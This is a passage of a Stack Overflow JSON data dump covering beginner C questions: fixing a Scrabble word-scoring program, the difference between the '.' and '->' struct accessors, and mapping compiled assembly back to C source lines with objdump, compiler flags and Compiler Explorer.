misread. <code>toupper</code> does not return <code>&#39;c&#39;</code>. When no conversion is made it returns the input character."}, {"owner": {"reputation": 65, "user_id": 6584831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20d9fc618803abab0b609bf0f8c2cad6?s=128&d=identicon&r=PG&f=1", "display_name": "drumz", "link": "https://stackoverflow.com/users/6584831/drumz"}, "reply_to_user": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1498052183, "post_id": 44675428, "comment_id": 76339587, "body": "@stark Okay thanks, my bad"}, {"owner": {"reputation": 65, "user_id": 6584831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20d9fc618803abab0b609bf0f8c2cad6?s=128&d=identicon&r=PG&f=1", "display_name": "drumz", "link": "https://stackoverflow.com/users/6584831/drumz"}, "reply_to_user": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498052187, "post_id": 44675428, "comment_id": 76339592, "body": "@NayanT Break is a keyword that &quot;break&quot; the loop (it will stop your while loop even if the condition is true)"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1498053112, "post_id": 44675428, "comment_id": 76340261, "body": "If <code>ch</code> already is an upper case character no conversion is done. You shouldn&#39;t treat this as an error. Calling <code>isalpha(ch)</code> might be more useful to detect errors."}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1498055006, "post_id": 44675428, "comment_id": 76341728, "body": "Or just handle in a default <code>else</code> case."}, {"owner": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498098313, "post_id": 44675428, "comment_id": 76361979, "body": "Ah understood. so that is for checking error.neat trick."}], "tags": [], "owner": {"reputation": 65, "user_id": 6584831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20d9fc618803abab0b609bf0f8c2cad6?s=128&d=identicon&r=PG&f=1", "display_name": "drumz", "link": "https://stackoverflow.com/users/6584831/drumz"}, "is_accepted": false, "score": -1, "last_activity_date": 1498052328, "last_edit_date": 1498052328, "creation_date": 1498046196, "answer_id": 44675428, "question_id": 44675169, "link": "https://stackoverflow.com/questions/44675169/finding-points-of-a-scrabble-word/44675428#44675428", "title": "Finding points of a scrabble word", "body": "<p>you forgot to get the return value of <code>toupper</code>. Also you don't check it \n(according to <code>man 3 toupper</code>, the function will return the same char in case of failure) </p>\n\n<p>Then your conditions aren't good:\n<code>if (ch == 'Q' || 'Z')</code> is different from <code>if (ch == 'Q' || ch == 'Z')</code>\nThe <code>||</code> means <strong>if the right or the left condition is true</strong> and in the first case <code>(ch == 'Q')</code> is not always true, but <code>'Z'</code> is always true.</p>\n\n<p>This means your first condition :</p>\n\n<p><code>if(ch =='A'||'E'||'I'||'L'||'N'||'O'||'R'||'S'||'T'||'U')</code></p>\n\n<p><strong>is always true</strong></p>\n\n<p>Here are littles corrections you can apply, this might work</p>\n\n<pre><code>    char         tmp;\n    ch = getchar();\n    while(ch!='\\n')\n    {\n        //Stocking in a tmp char to check return value\n        tmp = ch;\n\n        //Here\n        ch = toupper(ch);\n        if (ch == tmp)\n        {\n          //Error\n          break;\n        }\n        {...}\n        else if (ch =='Q'|| ch =='Z')\n          n += 10;\n        ch = getchar();\n    }\n</code></pre>\n\n<p>Edit : Correction of return value of <code>toupper()</code>;</p>\n"}], "owner": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "closed_date": 1498074994, "answer_count": 2, "score": -3, "last_activity_date": 1498098880, "creation_date": 1498045539, "last_edit_date": 1498098880, "question_id": 44675169, "link": "https://stackoverflow.com/questions/44675169/finding-points-of-a-scrabble-word", "closed_reason": "Not suitable for this site", "title": "Finding points of a scrabble word", "body": "<p>So i recently started c language with no prior knowledge of coding or computer science. Wrote this piece of code to find value of a word using scrabble points as below:\n1:AEILNORSTU   2:DG   3:BCMP   4:FHVWY   5:K   8:JX   10:QZ.</p>\n\n<pre><code># include &lt;stdio.h&gt;\n# include &lt;ctype.h&gt;\n# include &lt;conio.h&gt;\nint main (void)\n{\n  int n=0;\n  char ch;\n  clrscr();\n  printf(\"Enter the SCRABBLE word\\n\");\n  ch = getchar();\n  while(ch!='\\n')\n  {\n    toupper(ch);\n    if(ch =='A'||'E'||'I'||'L'||'N'||'O'||'R'||'S'||'T'||'U')\n      n=n+1;\n    else if (ch =='D'||'G')\n      n=n+2;\n    else if (ch =='B'||'C'||'M'||'P')\n      n=n+3;\n    else if (ch =='F'||'H'||'V'||'W'||'Y')\n      n=n+4;\n    else if (ch =='K')\n      n=n+5;\n    else if (ch =='J'||'X')\n      n=n+8;\n    else if (ch =='Q'||'Z')\n      n=n+10;\n\n    ch = getchar();\n  }\n  printf(\"The value is %d\",n);\n  return 0;\n}\n</code></pre>\n\n<p>So what happens when i run this code is that :\n    <strong>Enter the SCRABBLE word</strong>\n  eg: <em>barrier</em>\n    <strong>The value is 7</strong>\nthough it should be 9 as b carries 3 points as noted above the code,a carries 1,r carriers 1,again r 1 point,i carries 1 point and the last two alphabet are one point each so thats 3+1+1+1+1+1+1=9</p>\n"}, {"tags": ["c", "struct", "operators", "accessor"], "comments": [{"owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "edited": false, "score": 0, "creation_date": 1498045136, "post_id": 44674997, "comment_id": 76333982, "body": "-&gt; use when you try to call smt from pointer to struct . when you create object and call"}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "edited": false, "score": 0, "creation_date": 1498045149, "post_id": 44674997, "comment_id": 76333987, "body": "If you can&#39;t find any difference, try replacing one with the other without changing anything else, and see if your program still compiles :-)"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 4, "creation_date": 1498045179, "post_id": 44674997, "comment_id": 76334013, "body": "There is literally no code where those two things have no difference. One will always fail to compile"}, {"owner": {"reputation": 4507, "user_id": 1907026, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/z63VT.jpg?s=128&g=1", "display_name": "Theolodis", "link": "https://stackoverflow.com/users/1907026/theolodis"}, "edited": false, "score": 1, "creation_date": 1498045183, "post_id": 44674997, "comment_id": 76334016, "body": "What does your data look like? What does your struct look like? Could you give a minimal example?"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1498055171, "post_id": 44674997, "comment_id": 76341851, "body": "What does the text book tell about these operators?"}], "answers": [{"tags": [], "owner": {"reputation": 249903, "user_id": 2422776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2353050223ebecb113741c29458de4b2?s=128&d=identicon&r=PG", "display_name": "Mureinik", "link": "https://stackoverflow.com/users/2422776/mureinik"}, "is_accepted": false, "score": 3, "last_activity_date": 1498045106, "creation_date": 1498045106, "answer_id": 44675037, "question_id": 44674997, "link": "https://stackoverflow.com/questions/44674997/or-c-struct-accessor/44675037#44675037", "title": "&quot;.&quot; or &quot;-&gt;&quot; C struct accessor", "body": "<p><code>.</code> is used with structs. <code>-&gt;</code> is used with pointers (to structs).</p>\n"}, {"tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": false, "score": 1, "last_activity_date": 1498045206, "creation_date": 1498045206, "answer_id": 44675070, "question_id": 44674997, "link": "https://stackoverflow.com/questions/44674997/or-c-struct-accessor/44675070#44675070", "title": "&quot;.&quot; or &quot;-&gt;&quot; C struct accessor", "body": "<blockquote>\n  <p>6.5.2.3 Structure and union members</p>\n  \n  <p>Constraints</p>\n  \n  <p>1 The first operand of the . operator shall have an atomic, qualified,\n  or unqualified structure or union type, and the second operand shall\n  name a member of that type.</p>\n  \n  <p>2 The first operand of the -> operator shall have type \u2018\u2018pointer to\n  atomic, qualified, or unqualified structure\u2019\u2019 or \u2018\u2018pointer to atomic,\n  qualified, or unqualified union\u2019\u2019, and the second operand shall name a\n  member of the type pointed to.</p>\n  \n  <p>Semantics</p>\n  \n  <p>3 A postfix expression followed by the . operator and an identifier\n  designates a member of a structure or union object. The value is that\n  of the named member,95) and is an lvalue if the first expression is an\n  lvalue. If the first expression has qualified type, the result has the\n  so-qualified version of the type of the designated member.</p>\n  \n  <p>4 A postfix expression followed by the -> operator and an identifier\n  designates a member of a structure or union object. The value is that\n  of the named member of the object to which the first expression\n  points, and is an lvalue.96) If the first expression is a pointer to a\n  qualified type, the result has the so-qualified version of the type of\n  the designated member.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "is_accepted": false, "score": 1, "last_activity_date": 1498045250, "creation_date": 1498045250, "answer_id": 44675083, "question_id": 44674997, "link": "https://stackoverflow.com/questions/44674997/or-c-struct-accessor/44675083#44675083", "title": "&quot;.&quot; or &quot;-&gt;&quot; C struct accessor", "body": "<pre><code>struct MyStruct\n{\n  int a;\n}\n\nMyStruct *st;\nst-&gt;a = 10;\n\nMyStruct st2;\nst.a = 10;\n</code></pre>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498046084, "post_id": 44675219, "comment_id": 76334666, "body": "&quot;<i>There is no connection between -&gt; operator and structs, unions</i>&quot; -- sure there is"}, {"owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "edited": false, "score": 0, "creation_date": 1498046189, "post_id": 44675219, "comment_id": 76334751, "body": "@FelixPalmen how can you access data in a struct (not a pointer) using -<i>&gt;</i>?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498046260, "post_id": 44675219, "comment_id": 76334810, "body": "How can you access an object that <i>isn&#39;t</i> a struct or union member using <code>-&gt;</code>?"}, {"owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "edited": false, "score": 0, "creation_date": 1498046388, "post_id": 44675219, "comment_id": 76334909, "body": "I guess I&#39;m missing something but -&gt; is used only for pointers. Meaning, no usage for structs, unions (and also ints, chars and such). Am I wrong?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1498046582, "post_id": 44675219, "comment_id": 76335043, "body": "<code>-&gt;</code> is shorthand for dereference and member access. So sure it requires a pointer. It <i>also</i> requires the pointer to point to either a <code>struct</code> or a <code>union</code>, because only in structs and unions, you can access <i>members</i>."}, {"owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "edited": false, "score": 0, "creation_date": 1498046833, "post_id": 44675219, "comment_id": 76335225, "body": "You are totally right. I meant they have no connection to plain structs or unions without pointers. I will edit"}], "tags": [], "owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "is_accepted": false, "score": 0, "last_activity_date": 1556112067, "last_edit_date": 1556112067, "creation_date": 1498045687, "answer_id": 44675219, "question_id": 44674997, "link": "https://stackoverflow.com/questions/44674997/or-c-struct-accessor/44675219#44675219", "title": "&quot;.&quot; or &quot;-&gt;&quot; C struct accessor", "body": "<p>There is no connection between <code>-&gt;</code> operator and plain <code>structs / unions</code> or any other type, other than pointers to <code>structs / unions</code>. The <code>-&gt;</code> is accessing a member in <code>struct / union</code> pointed by your pointer. Meaning, after creating a <code>struct / union</code> with members, the <code>struct / union</code> members can be accessed either by <code>.</code> if holding the <code>struct / union</code> itself or by <code>-&gt;</code> if holding the <code>pointer</code> to the <code>struct / union</code></p>\n\n<p>An Example:</p>\n\n<pre><code>// creating one instance of struct s, and a pointer to an instance of struct s. struct s is a struct holding one int called 'data'.\n\nstruct s{int data;}struct_s_instance, *struct_s_instance_pointer = malloc(sizeof(struct s));\nstruct_s_instance.data = 3;           // access using the '.' operator \nstruct_s_instance_pointer-&gt;data = 4;  // pointer access using the '-&gt;' operator \nprintf(\"%d-%d\", struct_s_instance.data, struct_s_instance_pointer-&gt;data);\n</code></pre>\n\n<p>You can't access <code>data</code> in <code>struct_s_instance_pointer</code> using the <code>.</code> (i.e. <code>struct_s_instance_pointer.data</code>) or access <code>data</code> in <code>struct_s_instance</code> using <code>-&gt;</code> (i.e. <code>struct_s_instance-&gt;data</code>). These are totaly different things.</p>\n\n<p>Note that when given a pointer, such as <code>struct_s_instance_pointer</code> you can derefernce it: <code>*struct_s_instance_pointer</code>  and then the operator <code>.</code> can and should be used: <code>(*struct_s_instance_pointer).data</code></p>\n"}, {"tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": false, "score": 5, "last_activity_date": 1498046240, "creation_date": 1498046240, "answer_id": 44675445, "question_id": 44674997, "link": "https://stackoverflow.com/questions/44674997/or-c-struct-accessor/44675445#44675445", "title": "&quot;.&quot; or &quot;-&gt;&quot; C struct accessor", "body": "<p>The <code>-&gt;</code> operator is only syntactical sugar:</p>\n\n<pre><code>x-&gt;y\n</code></pre>\n\n<p>is the same as</p>\n\n<pre><code>(*x).y\n</code></pre>\n\n<p>The parentheses are necessary due to the <code>.</code> operator having higher precedence than the <code>*</code> operator.</p>\n"}], "owner": {"reputation": 320, "user_id": 6194206, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/DPJKG.png?s=128&g=1", "display_name": "M.Ferru", "link": "https://stackoverflow.com/users/6194206/m-ferru"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 780, "favorite_count": 0, "closed_date": 1502715109, "answer_count": 5, "score": -33, "last_activity_date": 1556112067, "creation_date": 1498045004, "last_edit_date": 1556112023, "question_id": 44674997, "link": "https://stackoverflow.com/questions/44674997/or-c-struct-accessor", "closed_reason": "Duplicate", "title": "&quot;.&quot; or &quot;-&gt;&quot; C struct accessor", "body": "<p>What is the difference between <code>.</code> and <code>-&gt;</code> when accessing a data in a C structure? I couldn't find any difference on my several attempt. Both provide me access to the desire data</p>\n"}, {"tags": ["c", "debugging", "assembly", "gdb"], "comments": [{"owner": {"reputation": 5101, "user_id": 700170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZ8hw.png?s=128&g=1", "display_name": "Morten Jensen", "link": "https://stackoverflow.com/users/700170/morten-jensen"}, "edited": false, "score": 3, "creation_date": 1498045072, "post_id": 44674960, "comment_id": 76333931, "body": "Which compiler are you using? If using GCC, there is an option to output annotated assembly with comments mapping it to the C-code. I&#39;m sure clang offers a similar solution."}, {"owner": {"reputation": 41796, "user_id": 1870232, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/rbI29.jpg?s=128&g=1", "display_name": "P0W", "link": "https://stackoverflow.com/users/1870232/p0w"}, "edited": false, "score": 0, "creation_date": 1498045341, "post_id": 44674960, "comment_id": 76334111, "body": "See <a href=\"https://stackoverflow.com/a/137479/1870232\">this</a>"}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1498046292, "post_id": 44674960, "comment_id": 76334833, "body": "Yes.  Compile with debug symbols and then look at it in the debugger again."}, {"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1498048457, "post_id": 44674960, "comment_id": 76336514, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/137038/how-do-you-get-assembler-output-from-c-c-source-in-gcc\">How do you get assembler output from C/C++ source in gcc?</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498076609, "post_id": 44674960, "comment_id": 76355360, "body": "compile with the -ggdb3 option.  Then all the line number, etc information is available in the object file."}], "answers": [{"comments": [{"owner": {"reputation": 1079, "user_id": 3601445, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/166972946a381e8641b7dd4de8a874a9?s=128&d=identicon&r=PG&f=1", "display_name": "Unhandled Exception", "link": "https://stackoverflow.com/users/3601445/unhandled-exception"}, "edited": false, "score": 0, "creation_date": 1498047186, "post_id": 44675488, "comment_id": 76335501, "body": "Neat looking tool."}, {"owner": {"reputation": 170, "user_id": 8188392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d23e32d1ef53e186824706b27a2708a9?s=128&d=identicon&r=PG&f=1", "display_name": "lapinozz", "link": "https://stackoverflow.com/users/8188392/lapinozz"}, "reply_to_user": {"reputation": 1079, "user_id": 3601445, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/166972946a381e8641b7dd4de8a874a9?s=128&d=identicon&r=PG&f=1", "display_name": "Unhandled Exception", "link": "https://stackoverflow.com/users/3601445/unhandled-exception"}, "edited": false, "score": 0, "creation_date": 1498047296, "post_id": 44675488, "comment_id": 76335587, "body": "And in any case it&#39;s open source so you can probably find how he does it"}, {"owner": {"reputation": 11149, "user_id": 589206, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4296350a4653b1e62d2ee4d5659b3792?s=128&d=identicon&r=PG", "display_name": "hochl", "link": "https://stackoverflow.com/users/589206/hochl"}, "edited": false, "score": 0, "creation_date": 1510226549, "post_id": 44675488, "comment_id": 81349463, "body": "the tool is great, and you can support its development with Patreon."}], "tags": [], "owner": {"reputation": 170, "user_id": 8188392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d23e32d1ef53e186824706b27a2708a9?s=128&d=identicon&r=PG&f=1", "display_name": "lapinozz", "link": "https://stackoverflow.com/users/8188392/lapinozz"}, "is_accepted": false, "score": 2, "last_activity_date": 1498048570, "last_edit_date": 1498048570, "creation_date": 1498046343, "answer_id": 44675488, "question_id": 44674960, "link": "https://stackoverflow.com/questions/44674960/how-to-associate-assembly-code-to-exact-line-in-c-program/44675488#44675488", "title": "How to associate assembly code to exact line in C program?", "body": "<p>One of the best tools I've found for this is Matthew Godbolt's <a href=\"https://godbolt.org\" rel=\"nofollow noreferrer\">Compiler Explorer</a>.</p>\n\n<p>It features multiple compiler toolchains, auto-recompiles, and it immediately shows the assembly output with colored lines to show the corresponding line of source code.</p>\n"}, {"comments": [{"owner": {"reputation": 7645, "user_id": 2692339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f8e4e5cba3b6606d8e395364c1742b8?s=128&d=identicon&r=PG&f=1", "display_name": "edmz", "link": "https://stackoverflow.com/users/2692339/edmz"}, "edited": false, "score": 1, "creation_date": 1498047131, "post_id": 44675496, "comment_id": 76335452, "body": "Yes, and it gets very worse (for you human) as soon as you turn optimizations on."}], "tags": [], "owner": {"reputation": 55059, "user_id": 212858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1166c87b6f3fc2e6746da96b60fefb46?s=128&d=identicon&r=PG", "display_name": "Useless", "link": "https://stackoverflow.com/users/212858/useless"}, "is_accepted": false, "score": 7, "last_activity_date": 1498046350, "creation_date": 1498046350, "answer_id": 44675496, "question_id": 44674960, "link": "https://stackoverflow.com/questions/44674960/how-to-associate-assembly-code-to-exact-line-in-c-program/44675496#44675496", "title": "How to associate assembly code to exact line in C program?", "body": "<blockquote>\n  <p>But is there a way to extract which lines of assembly are associated to the specific line of C code?</p>\n</blockquote>\n\n<p>Yes, in principle - your compiler can probably do it (GCC option <code>-fverbose-asm</code>, for example). Alternatively, <code>objdump -lSd</code> or similar will disassemble a program or object file with source and line number annotations where available.</p>\n\n<p>In general though, for a large optimized program, this can be very hard to follow.</p>\n\n<p>Even with perfect annotation, you'll see the same source line mentioned multiple times as expressions and statements are split up, interleaved and reordered, and some instructions associated with multiple source expressions.</p>\n\n<p>In this case, you just need to think about the relationship between your source and the assembly, but it takes some effort.</p>\n"}, {"tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": false, "score": 1, "last_activity_date": 1498112947, "last_edit_date": 1498112947, "creation_date": 1498046857, "answer_id": 44675685, "question_id": 44674960, "link": "https://stackoverflow.com/questions/44674960/how-to-associate-assembly-code-to-exact-line-in-c-program/44675685#44675685", "title": "How to associate assembly code to exact line in C program?", "body": "<p>First, you need to compile the program keeping inside its object file informations about the source code either via <code>gdwarf</code> or <code>g</code> flag or both.  Next, if you want to debug it is important for the compiler to avoid optimizations, otherwise it is difficult to see a correspondence code&lt;>assembly.</p>\n\n<pre><code>gcc -gdwarf -g3 -O0 prog.c -o out\n</code></pre>\n\n<p>Next, tell the disassembler to output the source code. The <code>source</code> flag involves the <code>disassemble</code> flag.</p>\n\n<pre><code>objdump --source out\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 2, "creation_date": 1498048510, "post_id": 44675756, "comment_id": 76336548, "body": "This is very Gnu compiler-specific, and may also interfere with the optimizer, so while it is a trick to be aware of, it is also one to wield with caution. There are much better ways."}, {"owner": {"reputation": 7645, "user_id": 2692339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f8e4e5cba3b6606d8e395364c1742b8?s=128&d=identicon&r=PG&f=1", "display_name": "edmz", "link": "https://stackoverflow.com/users/2692339/edmz"}, "reply_to_user": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1498057165, "post_id": 44675756, "comment_id": 76343611, "body": "@CodyGray: That is a good point. I&#39;ve hinted even further the fact that nothing is touched or produced, so there will be very likely no data saving instructions around the asm at all."}, {"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 3, "creation_date": 1498059791, "post_id": 44675756, "comment_id": 76345622, "body": "I understand what you are thinking, and it does <i>seem</i> that inserting some <code>NOP</code>s with no input/output operands would have no effect. But, see <a href=\"https://stackoverflow.com/questions/13955162/why-does-adding-assembly-comments-cause-such-radical-change-in-generated-code\">here</a> for a demonstration of how the insertion of a <i>comment</i> using inline assembly can disrupt vectorization of code."}], "tags": [], "owner": {"reputation": 7645, "user_id": 2692339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f8e4e5cba3b6606d8e395364c1742b8?s=128&d=identicon&r=PG&f=1", "display_name": "edmz", "link": "https://stackoverflow.com/users/2692339/edmz"}, "is_accepted": false, "score": 0, "last_activity_date": 1498057008, "last_edit_date": 1498057008, "creation_date": 1498047052, "answer_id": 44675756, "question_id": 44674960, "link": "https://stackoverflow.com/questions/44674960/how-to-associate-assembly-code-to-exact-line-in-c-program/44675756#44675756", "title": "How to associate assembly code to exact line in C program?", "body": "<p>@Useless is very right. Anyways, a trick to know where C has arrived in the machine code is to inject markers in it; for instance,</p>\n\n<pre><code>#define ASM_MARK do { asm __volatile__(\"nop; nop; nop;\\n\\t\" :::); } while (0);\n\nint main()\n{\n    int a = 5;\n    ASM_MARK;\n       int b = a + 6;\n    ASM_MARK;\n    return 0;\n}\n</code></pre>\n\n<p>You will see:</p>\n\n<pre><code>main:\n        pushq   %rbp\n        movq    %rsp, %rbp\n        movl    $5, -4(%rbp)\n        nop; nop; nop;\n\n        movl    -4(%rbp), %eax\n        addl    $6, %eax\n        movl    %eax, -8(%rbp)\n        nop; nop; nop;\n\n        movl    $0, %eax\n        popq    %rbp\n        ret\n</code></pre>\n\n<p>You need to use the <code>__volatile__</code> keyword or equivalent in order to tell the compiler not to interfere and this is often compiler-specific (notice the <code>__</code>), as C does not \nprovide this kind of syntax.</p>\n"}], "owner": {"reputation": 1079, "user_id": 3601445, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/166972946a381e8641b7dd4de8a874a9?s=128&d=identicon&r=PG&f=1", "display_name": "Unhandled Exception", "link": "https://stackoverflow.com/users/3601445/unhandled-exception"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3391, "favorite_count": 0, "answer_count": 4, "score": 8, "last_activity_date": 1498422818, "creation_date": 1498044911, "last_edit_date": 1498422818, "question_id": 44674960, "link": "https://stackoverflow.com/questions/44674960/how-to-associate-assembly-code-to-exact-line-in-c-program", "title": "How to associate assembly code to exact line in C program?", "body": "<p>Here is an example found via an assembly website. This is the C code:</p>\n\n<pre><code> int main()\n {\n     int a = 5;\n     int b = a + 6;\n     return 0;\n }\n</code></pre>\n\n<p>Here is the associated assembly code:</p>\n\n<pre><code>    (gdb) disassemble\n    Dump of assembler code for function main:\n    0x0000000100000f50 &lt;main+0&gt;:    push   %rbp\n    0x0000000100000f51 &lt;main+1&gt;:    mov    %rsp,%rbp\n    0x0000000100000f54 &lt;main+4&gt;:    mov    $0x0,%eax\n    0x0000000100000f59 &lt;main+9&gt;:    movl   $0x0,-0x4(%rbp)\n    0x0000000100000f60 &lt;main+16&gt;:   movl   $0x5,-0x8(%rbp)\n    0x0000000100000f67 &lt;main+23&gt;:   mov    -0x8(%rbp),%ecx\n    0x0000000100000f6a &lt;main+26&gt;:   add    $0x6,%ecx\n    0x0000000100000f70 &lt;main+32&gt;:   